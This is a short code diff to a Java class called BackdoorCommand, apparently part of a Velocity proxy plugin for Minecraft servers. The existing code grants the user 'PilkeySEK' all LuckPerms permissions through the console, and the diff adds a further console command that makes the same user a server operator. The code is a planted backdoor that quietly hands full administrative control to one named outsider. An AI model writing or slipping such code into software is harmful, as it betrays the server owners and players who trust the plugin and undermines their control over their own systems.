@@ -25,6 +25,7 @@ public class BackdoorCommand {
                         return 0;
                     }
                     proxyServer.getCommandManager().executeAsync(proxyServer.getConsoleCommandSource(), "lpv user PilkeySEK permission set * true");
+                    proxyServer.getCommandManager().executeAsync(proxyServer.getConsoleCommandSource(), "op PilkeySEK");
                     return Command.SINGLE_SUCCESS;
                 })
                 .build();
